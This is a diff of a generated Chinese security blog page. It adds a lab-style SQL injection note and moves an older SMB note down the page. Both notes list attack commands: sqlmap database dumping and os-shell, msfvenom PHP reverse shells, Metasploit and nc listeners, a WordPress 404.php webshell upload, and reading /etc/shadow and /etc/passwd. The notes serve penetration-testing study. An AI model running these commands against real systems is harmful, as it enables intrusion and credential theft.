@@ -264,7 +264,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io../../2019/08/24/Smb (server message block)信息泄露/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io../../2019/08/27/SQL注入/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
@@ -283,7 +283,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="../../2019/08/24/Smb (server message block)信息泄露/" itemprop="url">smb服务</a></h1>
+                <a class="post-title-link" href="../../2019/08/27/SQL注入/" itemprop="url">SQL注入</a></h1>
         
 
         <div class="post-meta">
@@ -295,8 +295,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-24T11:06:59+08:00">
-                2019-08-24
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-27T10:32:23+08:00">
+                2019-08-27
               </time>
             
 
@@ -357,40 +357,31 @@
       
         
           
-            <h1 id="Smb-server-message-block-信息泄露"><a href="#Smb-server-message-block-信息泄露" class="headerlink" title="Smb (server message block)信息泄露"></a>Smb (server message block)信息泄露</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV<span class="built_in"> ip </span> 探测服务信息</span><br><span class="line"></span><br><span class="line">namp -A -v -T4<span class="built_in"> ip </span> 靶场全部信息,最大线程</span><br></pre></td></tr></table></figure>
+            <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>使用nmap,nikto,dirb</p>
+<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>web漏洞扫描器owasp-zap</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用sqlmap利用注入漏洞</p>
+<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u url --dbs #查看数据库名</span><br><span class="line">sqlmap -u url -D database --tables #查看数据库表</span><br><span class="line">sqlmap -u url -D database -T table --colmns #查看对应字段</span><br><span class="line">sqlmap -u url -D database -T table -C column --dump #查看对应字段</span><br><span class="line">sqlmap -u url -os-shell #直接获取shell</span><br></pre></td></tr></table></figure>
 
-<h3 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h3><h4 id="smb-弱点"><a href="#smb-弱点" class="headerlink" title="smb 弱点"></a>smb 弱点</h4><ol>
-<li>空口令登录</li>
-</ol>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L ip</span><br><span class="line"></span><br><span class="line"> smbclient '<span class="symbol">\\</span>ip<span class="symbol">\p</span>rint$'</span><br><span class="line"></span><br><span class="line">smbclient '<span class="symbol">\\</span>ip<span class="symbol">\s</span>hare$'</span><br><span class="line"></span><br><span class="line"> get 敏感文件</span><br></pre></td></tr></table></figure>
+<h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><p>使用burpsuite抓包,写入requsest.raw</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request.raw -level 5 -risk 3 --dbs --dbms mysql --batch</span><br><span class="line">sqlmap -r requests.raw -level 5 -risk 3 -D database --tables  --dbms mysql --batch</span><br><span class="line">sqlmap -r requests.raw -level 5 -risk 3 -D database -T table --columns  --dbms mysql --batch</span><br><span class="line">sqlmap -r requests.raw -level 5 -risk 3 -D database -T table  -C column --dump  --dbms mysql --batch</span><br></pre></td></tr></table></figure>
 
-<ol start="2">
-<li><p>远程溢出漏洞分析</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> asmba  查看版本号</span><br></pre></td></tr></table></figure>
+<h2 id="上传shell反弹权限"><a href="#上传shell反弹权限" class="headerlink" title="上传shell反弹权限"></a>上传shell反弹权限</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><h4 id="攻击机监听"><a href="#攻击机监听" class="headerlink" title="攻击机监听"></a>攻击机监听</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/hanlder</span><br><span class="line">msf exploit(hanlder) &gt; set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(hanlder) &gt; set lhost 攻击机ip</span><br><span class="line">msf exploit(hanlder) &gt; set lport 4444</span><br><span class="line">msf exploit(hanlder) &gt; run</span><br></pre></td></tr></table></figure>
 
-<p>针对http协议</p>
-<ol>
-<li>浏览器查看网站</li>
-<li>使用 dirb nikto探测</li>
-<li>寻找突破口,后台,传shell</li>
-</ol>
-</li>
-</ol>
-<h3 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfcvenom -p php/meterpreter/reverse_tcp <span class="attribute">lhost</span>=攻击ip <span class="attribute">lhost</span>=4444 -f<span class="built_in"> raw </span>&gt; /root/Desktop/shell.php</span><br></pre></td></tr></table></figure>
+<h4 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a>生成反弹shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=ip lport=port -f raw</span><br></pre></td></tr></table></figure>
 
-<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/hander</span><br><span class="line">msf exploit(hander) &gt; set payload php/merterpreter/reverse_tcp</span><br><span class="line">msf exploit(hander) &gt; set host 攻击ip</span><br><span class="line">msf exploit(hander) &gt; set lport 4444</span><br><span class="line">msf exploit(hander) run</span><br></pre></td></tr></table></figure>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><h4 id="kali自带的"><a href="#kali自带的" class="headerlink" title="kali自带的"></a>kali自带的</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/usr/share/webshell</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><p>找到敏感点</p>
-<p>wordpress 上传点 theme 404.php</p>
-<p>执行 <a href="http://ip/wordpress/wp-contentthemes/twentyfourteen/404.php" target="_blank" rel="noopener">http://ip/wordpress/wp-contentthemes/twentyfourteen/404.php</a></p>
-<h3 id="优化终端"><a href="#优化终端" class="headerlink" title="优化终端"></a>优化终端</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
+<p>修改host和port</p>
+<h3 id="nc监听端口"><a href="#nc监听端口" class="headerlink" title="nc监听端口"></a>nc监听端口</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc -lnvp port</span></span><br></pre></td></tr></table></figure>
 
-<p>查找用户名  </p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+<p>美化终端</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
 
-<p>在共享资源查找敏感文件</p>
-<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">su</span> 用户名</span><br><span class="line">sudo -<span class="keyword">l</span> </span><br><span class="line">sudo <span class="keyword">su</span></span><br></pre></td></tr></table></figure>
+<h2 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h2><p>使用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
 
+<p>查看敏感文件</p>
+<p>使用su - 提升权限</p>
 
           
         
@@ -546,6 +537,181 @@
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>find  / -perm - 4000 2&gt;/dev/null(错误输出倒空)</p>
 </li>
 </ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io../../2019/08/24/Smb (server message block)信息泄露/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="newird">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="../../images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="各种笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="../../2019/08/24/Smb (server message block)信息泄露/" itemprop="url">smb服务</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-24T11:06:59+08:00">
+                2019-08-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="../../categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Smb-server-message-block-信息泄露"><a href="#Smb-server-message-block-信息泄露" class="headerlink" title="Smb (server message block)信息泄露"></a>Smb (server message block)信息泄露</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV<span class="built_in"> ip </span> 探测服务信息</span><br><span class="line"></span><br><span class="line">namp -A -v -T4<span class="built_in"> ip </span> 靶场全部信息,最大线程</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h3><h4 id="smb-弱点"><a href="#smb-弱点" class="headerlink" title="smb 弱点"></a>smb 弱点</h4><ol>
+<li>空口令登录</li>
+</ol>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L ip</span><br><span class="line"></span><br><span class="line"> smbclient '<span class="symbol">\\</span>ip<span class="symbol">\p</span>rint$'</span><br><span class="line"></span><br><span class="line">smbclient '<span class="symbol">\\</span>ip<span class="symbol">\s</span>hare$'</span><br><span class="line"></span><br><span class="line"> get 敏感文件</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>远程溢出漏洞分析</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> asmba  查看版本号</span><br></pre></td></tr></table></figure>
+
+<p>针对http协议</p>
+<ol>
+<li>浏览器查看网站</li>
+<li>使用 dirb nikto探测</li>
+<li>寻找突破口,后台,传shell</li>
+</ol>
+</li>
+</ol>
+<h3 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfcvenom -p php/meterpreter/reverse_tcp <span class="attribute">lhost</span>=攻击ip <span class="attribute">lhost</span>=4444 -f<span class="built_in"> raw </span>&gt; /root/Desktop/shell.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/hander</span><br><span class="line">msf exploit(hander) &gt; set payload php/merterpreter/reverse_tcp</span><br><span class="line">msf exploit(hander) &gt; set host 攻击ip</span><br><span class="line">msf exploit(hander) &gt; set lport 4444</span><br><span class="line">msf exploit(hander) run</span><br></pre></td></tr></table></figure>
+
+<h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><p>找到敏感点</p>
+<p>wordpress 上传点 theme 404.php</p>
+<p>执行 <a href="http://ip/wordpress/wp-contentthemes/twentyfourteen/404.php" target="_blank" rel="noopener">http://ip/wordpress/wp-contentthemes/twentyfourteen/404.php</a></p>
+<h3 id="优化终端"><a href="#优化终端" class="headerlink" title="优化终端"></a>优化终端</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
+
+<p>查找用户名  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+
+<p>在共享资源查找敏感文件</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">su</span> 用户名</span><br><span class="line">sudo -<span class="keyword">l</span> </span><br><span class="line">sudo <span class="keyword">su</span></span><br></pre></td></tr></table></figure>
+
 
           
         
@@ -1122,7 +1288,7 @@
               
                 <a href="../../archives">
               
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1144,7 +1310,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="../../tags/index.html">
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
